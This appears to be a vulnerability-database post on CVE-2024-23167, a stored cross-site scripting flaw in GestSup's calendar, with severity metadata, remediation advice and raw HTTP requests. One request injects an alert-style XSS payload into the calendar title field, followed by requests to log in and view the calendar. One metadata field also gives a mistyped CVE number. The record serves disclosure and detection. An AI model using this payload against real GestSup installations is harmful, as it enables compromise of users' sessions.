---
layout: post
cve_id: CVE-2024-23167
title: GestSup - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2024/CVE-2024-23167.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-23167.yaml
snort2_rule: N/A
snort3_rule: N/A
author: eeche,chae1xx1os,persona-twotwo,soonghee2,gy741
severity: high
impact: 'This vulnerability could allow unauthenticated attackers to compromise users
  accessing the Calendar feature of the application.

  '
remediation: 'Apply security patches, validate and sanitize inputs to prevent XSS,
  and ensure proper authentication. Prevent JavaScript execution in the calendar.php
  file.

  '
reference:
- https://www.synacktiv.com/advisories/multiple-vulnerabilities-on-gestsup-3244
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-23167
- https://doc.gestsup.fr/install/
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
  cvss-score: 8.6
  cve-id: CVE-2024-231637
metadata:
  max-request: 3
  vendor: gestsup
  product: gestsup
tags:
- cve2024
- cve
- xss
- gestsup
- vuln
---

## üîç Vulnerability Description
GestSup allows its users to add events to the calendar of all users. This is the HTTP request sent when a user adds an event to their calendar.


## üåê HTTP Request
```nohighlight
POST /ajax/calendar.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh: Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15
Connection: close
Content-Length: 139
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

action=add_event&title=<img/src/onerror=alert(document.domain)>&start=2026/01/14 07:30:00&end=2026/01/14 23:00:00&allday=false&technician=1
```

```nohighlight
POST /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

login=NKB6yd&pass=8WEXVO&submit=submit
```

```nohighlight
GET /index.php?page=calendar HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Connection: close
Accept-Encoding: gzip
```

